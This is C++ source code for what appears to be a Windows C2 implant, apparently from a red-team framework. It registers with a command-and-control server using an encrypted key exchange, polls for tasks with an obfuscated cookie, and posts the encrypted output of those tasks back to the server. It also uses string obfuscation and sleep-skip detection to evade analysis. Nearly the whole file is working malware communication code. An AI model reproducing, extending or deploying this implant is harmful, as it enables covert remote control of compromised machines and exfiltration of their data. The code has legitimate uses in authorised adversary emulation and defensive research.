#include <windows.h>
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "httpclient.h"
#include "implant.h"
#include "crypto.h"
#include "profile.h"
#include "task.h"
#include "debug.h"
#include "utils.h"
#include "constants.h"
#include "antidebug.h"
#include <string>
#include <iostream>

using namespace std;
using namespace andrivet::ADVobfuscator;

MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey)
{
    rapidjson::Document registerDocument;
    registerDocument.SetObject();
    rapidjson::Document::AllocatorType &allocator = registerDocument.GetAllocator();
    rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
    string password(C2_REGISTER_PASSWORD);
    // Encrypt pubKey with password
    string payload = encryptB64SecretBox(password, pubKey);
    rapidjson::Value payloadVal(payload.c_str(), allocator);
    registerDocument.AddMember("txid", payloadVal, allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    registerDocument.Accept(writer);
    const char *key_json = buffer.GetString();

    PSIZE_T outSize = 0;

    // Register
    string res = HTTPRequest(L"POST", serverUrl, toWide(REGISTER_ENDPOINT), C2_PORT, toWide(REGISTER_USER_AGENT), toWide(REGISTER_HEADERS), (LPBYTE)key_json, strlen(key_json), outSize, USE_TLS);

    // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
    DEBUG_PRINTF("Register response: %s\n", res.c_str());
    // cout << res_str << endl;
    rapidjson::Document resDocument;
    resDocument.Parse(res.c_str());
    if (resDocument.HasParseError())
    {
        DEBUG_PRINTF("Error parsing JSON\n");
        return NULL;
    }

    DEBUG_PRINTF("status: %d\n", resDocument["status"].GetBool());
    DEBUG_PRINTF("Config: %s\n", resDocument["c"].GetString());

    const rapidjson::Value &c = resDocument["c"];
    string c_str = c.GetString();
    string cDecoded = base64DecodeToString(c_str);
    string b64ServerPubKey = resDocument["k"].GetString();

    // We still need to decrypt the config
    string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);

    return parseMalleableConfig(decryptedConfig, privKey);
}

Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
{
    PSIZE_T outSize = 0;

    std::ostringstream oss;
    oss << OBFUSCATED("Cookie: ") << profile->cookie << "=" << profile->implantId;
    string authCookieString = oss.str();
    std::wstring authCookie(authCookieString.begin(), authCookieString.end());
    DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());

    int reqCtr = 0;
    while (reqCtr < profile->maxRetries)
    {
        DEBUG_PRINTF("Checkin attempt %d\n", reqCtr);
        string res = HTTPRequest(L"GET", serverUrl, toWide(CHECKIN_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), NULL, 0, outSize, USE_TLS);

        if (res.empty())
        {
            DEBUG_PRINTF("Checkin failed\n");
            reqCtr++;
            if (DetectSleepSkip(profile->retryWait))
            {
                DEBUG_PRINTF("Sleep skip detected, skipping checkin\n");
                return NULL;
            }
            continue;
        }

        DEBUG_PRINTF("Checkin done\n");
        DEBUG_PRINTF("Response: %s\n", res.c_str());
        // decode and decrypt the response
        string resDecoded = decryptB64String(profile->base64ServerPublicKey,
                                             profile->base64EncryptionKey,
                                             res);

        DEBUG_PRINTF("Checkin response: %s\n", resDecoded.c_str());

        return parseTask(resDecoded);
    }
    // If we get here, we failed to checkin, so exit
    DEBUG_PRINTF("Failed to checkin, exiting\n");
    exit(0);
}

bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool success, MalleableProfile *profile)
{
    /* Payload format:
    {
        "status": bool,
        "tid": taskId,
        "output": "base64 encoded results"
    }

    */

    // JSON encode the results
    string resultsB64 = base64EncodeString(results);
    rapidjson::Document resultsDocument;
    rapidjson::Value resObj(rapidjson::kObjectType);
    resultsDocument.SetObject();
    rapidjson::Value resultsVal;
    resultsVal.SetString(resultsB64.c_str(), resultsDocument.GetAllocator());
    resultsDocument.AddMember("output", resultsVal, resultsDocument.GetAllocator());
    rapidjson::Value tidVal;
    tidVal.SetString(taskId, resultsDocument.GetAllocator());
    resultsDocument.AddMember("tid", tidVal, resultsDocument.GetAllocator());
    rapidjson::Value statusVal;
    statusVal.SetBool(success);
    resultsDocument.AddMember("status", statusVal, resultsDocument.GetAllocator());

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    resultsDocument.Accept(writer);
    const char *results_json = buffer.GetString();

    // Encrypt the results
    string encryptedResults = encryptB64String(profile->base64ServerPublicKey, profile->base64EncryptionKey, results_json);

    DEBUG_PRINTF("Results JSON: %s\n", results_json);

    // Build auth cookie
    std::ostringstream oss;
    oss << OBFUSCATED("Cookie: ") << profile->cookie << "=" << profile->implantId;
    string authCookieString = oss.str();
    std::wstring authCookie(authCookieString.begin(), authCookieString.end());

    int reqCtr = 0;
    while (reqCtr < profile->maxRetries)
    {
        DEBUG_PRINTF("SendTaskResult attempt %d\n", reqCtr);
        // Send the results
        PSIZE_T outSize = 0;
        string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);

        DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
        if (res.empty())
        {
            DEBUG_PRINTF("SendTaskResult failed\n");
            reqCtr++;
            if (DetectSleepSkip(profile->retryWait))
            {
                DEBUG_PRINTF("Sleep skip detected, skipping SendTaskResult\n");
                return false;
            }
            continue;
        }
        DEBUG_PRINTF("SendTaskResult done\n");
        return res.c_str() == OBFUSCATED("OK");
    }
    // If we get here, we failed to send the results, so exit
    DEBUG_PRINTF("Failed to send results, exiting\n");
    exit(0);

    // // Send the results
    // PSIZE_T outSize = 0;
    // string res = HTTPRequest(L"POST", serverUrl, toWide(TASK_RESULTS_ENDPOINT), C2_PORT, string_to_lpcwstr(profile->userAgent), authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, USE_TLS);

    // DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());

    // return res.c_str() == OBFUSCATED("OK");
}
